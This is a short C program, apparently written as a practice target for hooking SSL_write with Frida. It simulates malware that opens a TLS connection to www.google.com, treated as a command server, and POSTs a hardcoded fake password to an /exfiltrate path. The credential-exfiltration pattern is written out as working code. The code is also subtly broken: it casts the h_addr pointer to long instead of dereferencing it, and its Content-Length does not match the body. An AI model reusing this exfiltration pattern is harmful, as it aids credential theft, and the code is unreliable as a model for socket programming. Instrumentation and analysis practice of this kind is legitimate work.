#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

// Simple "Malware" that sends data to "C2" server (google.com) via SSL
int main() {
    struct hostent *host;
    struct sockaddr_in addr;
    int sock;
    SSL_CTX *ctx;
    SSL *ssl;
    
    // 1. Initialize OpenSSL
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    ctx = SSL_CTX_new(TLS_client_method());

    // 2. Resolve Google's IP
    host = gethostbyname("www.google.com");
    if (!host) { perror("DNS resolution failed"); return 1; }

    // 3. Create Socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(443);
    addr.sin_addr.s_addr = (long)(host->h_addr);

    printf("[*] Connecting to C2 (www.google.com)...\n");
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        perror("Connect failed");
        return 1;
    }

    // 4. Perform SSL Handshake
    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    if (SSL_connect(ssl) == -1) {
        ERR_print_errors_fp(stderr);
        return 1;
    }

    // 5. Send "Stolen" Data (This is what we want to hook!)
    char *request = "POST /exfiltrate HTTP/1.1\r\n"
                    "Host: www.google.com\r\n"
                    "Content-Type: application/json\r\n"
                    "Content-Length: 42\r\n\r\n"
                    "{\"password\": \"SuperSecretPassword123!\"}";

    printf("[*] Sending encrypted data...\n");
    SSL_write(ssl, request, strlen(request)); // <--- FRIDA HOOKS THIS

    // Cleanup
    SSL_free(ssl);
    close(sock);
    SSL_CTX_free(ctx);
    return 0;
}